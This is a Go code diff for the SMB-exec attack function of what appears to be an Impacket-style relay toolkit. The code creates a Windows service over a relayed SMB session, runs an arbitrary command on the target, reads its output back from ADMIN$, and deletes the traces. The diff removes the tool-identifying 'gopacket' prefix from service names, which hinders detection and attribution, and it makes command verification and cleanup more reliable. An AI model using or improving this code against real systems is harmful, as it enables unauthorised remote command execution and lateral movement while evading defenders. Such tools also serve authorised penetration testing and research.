@@ -19,7 +19,6 @@ import (
 	"encoding/binary"
 	"fmt"
 	"log"
-	"math/rand"
 	"strings"
 	"time"
 	"unicode/utf16"
@@ -350,17 +349,18 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 	}
 	defer sc.Close()
 
-	// Generate random service name and remote output file. The command's
-	// stdout/stderr is redirected to the target temp file; reading it back is
-	// what proves the command actually executed (Impacket behavior).
-	serviceName := fmt.Sprintf("gopacket%04x", rand.Intn(0xFFFF))
-	outFile := fmt.Sprintf("gopacketout%04x.tmp", rand.Intn(0xFFFF))
+	// Random names (no tool-identifying prefix). The command's output goes to a
+	// target temp file terminated by a completion marker; finding the marker on
+	// read-back proves the command ran to completion (Impacket-style verify).
+	serviceName := randomName()
+	outFile := randomName() + ".tmp"
 	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)
 
 	rl := &runLog{}
 	rl.Printf("[*] Executing command on %s via service creation...", cfg.TargetAddr)
 
-	binaryPath := fmt.Sprintf("%%COMSPEC%% /C %s > %%SystemRoot%%\\%s 2>&1", cfg.Command, remoteOut)
+	binaryPath := fmt.Sprintf("%%COMSPEC%% /C %s > %%SystemRoot%%\\%s 2>&1 & echo %s >> %%SystemRoot%%\\%s",
+		cfg.Command, remoteOut, cmdDoneMarker, remoteOut)
 
 	rl.Printf("[*] Creating service %s...", serviceName)
 
@@ -385,12 +385,17 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 		rl.Printf("[*] Service start returned: %v (expected for cmd.exe services)", err)
 	}
 
-	// Wait for the command to write its output, then download it.
+	// Poll for the output file until the completion marker appears (the file is
+	// created at command start, so existence alone does not mean it finished).
 	var output []byte
 	found := false
 	for i := 0; i < 20; i++ {
 		time.Sleep(500 * time.Millisecond)
-		if data, derr := client.DownloadFile("ADMIN$", remoteOut); derr == nil {
+		data, derr := client.DownloadFile("ADMIN$", remoteOut)
+		if derr != nil {
+			continue
+		}
+		if strings.Contains(string(data), cmdDoneMarker) {
 			output = data
 			found = true
 			break
@@ -399,31 +404,46 @@ func smbExecAttack(client *SMBRelayClient, cfg *Config) error {
 
 	rl.Printf("[*] Deleting service %s...", serviceName)
 
-	// Close the create handle and re-open by name for delete
-	// (relay sessions may lose access on the original handle after start)
+	// Close the create handle and re-open by name for delete. The relay session
+	// may lose access on the original handle after start, so retry a few times.
 	sc.CloseServiceHandle(svcHandle)
 
-	deleteHandle, err := sc.OpenService(serviceName, svcctl.SERVICE_ALL_ACCESS)
-	if err != nil {
-		rl.Printf("[-] Warning: failed to re-open service for delete: %v", err)
-	} else {
-		if err := sc.DeleteService(deleteHandle); err != nil {
-			rl.Printf("[-] Service %s could not be deleted (%v) — it may still exist on the target", serviceName, err)
+	var delErr error
+	for attempt := 0; attempt < 3; attempt++ {
+		dh, oerr := sc.OpenService(serviceName, svcctl.SERVICE_ALL_ACCESS)
+		if oerr != nil {
+			delErr = oerr
+			time.Sleep(500 * time.Millisecond)
+			continue
 		}
-		sc.CloseServiceHandle(deleteHandle)
+		delErr = sc.DeleteService(dh)
+		sc.CloseServiceHandle(dh)
+		if delErr == nil {
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
+	}
+	if delErr != nil {
+		rl.Printf("[-] Service %s could not be deleted after retries (%v) — it may still exist on the target", serviceName, delErr)
 	}
 
-	if found {
-		if err := client.DeleteFile("ADMIN$", remoteOut); err != nil {
-			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, err)
+	// Always best-effort remove the temp output file, success or not.
+	if derr := client.DeleteFile("ADMIN$", remoteOut); derr != nil {
+		if found {
+			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, derr)
+		} else {
+			verboseLog("[-] Best-effort delete of %s failed: %v", remoteOut, derr)
 		}
-	} else {
-		rl.Printf("[-] No output file from target (%s) — command did not execute", remoteOut)
-		return fmt.Errorf("command did not execute on %s (no output file %s)", cfg.TargetAddr, remoteOut)
 	}
 
-	if len(output) > 0 {
-		rl.Printf("[+] Command output:\n%s", strings.TrimRight(string(output), "\r\n"))
+	if !found {
+		rl.Printf("[-] No completed output from target (%s) — command did not execute (no file or missing %s marker)", remoteOut, cmdDoneMarker)
+		return fmt.Errorf("command did not execute on %s (no completion marker in %s)", cfg.TargetAddr, remoteOut)
+	}
+
+	text := strings.TrimSpace(strings.ReplaceAll(string(output), cmdDoneMarker, ""))
+	if text != "" {
+		rl.Printf("[+] Command output:\n%s", text)
 	} else {
 		rl.Printf("[*] Command executed (no output)")
 	}
